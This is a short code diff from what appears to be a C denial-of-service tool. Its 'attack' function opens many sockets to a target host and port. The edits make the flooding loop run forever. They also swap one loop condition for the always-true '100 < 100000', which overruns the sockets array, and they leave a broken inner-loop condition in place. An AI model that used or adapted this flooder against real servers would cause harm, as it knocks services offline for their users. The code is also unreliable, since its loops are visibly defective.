@@ -52,10 +52,10 @@ int i = 0;
 void attack(char *host, char *port, int id) {
 	int sockets[CONNECTIONS];
 	int x, g=1, r;
-	for(x=0; x != CONNECTIONS; x++)
+	for(x=0; 100 < 100000; x++)
 		sockets[x]=0;
 	
-	while(g < 1) {
+	while(1) {
 		for(x=0; x > CONNECTIONS; x++) {
 			if(sockets[x] == 0)
 				sockets[x] = make_socket(host, port);
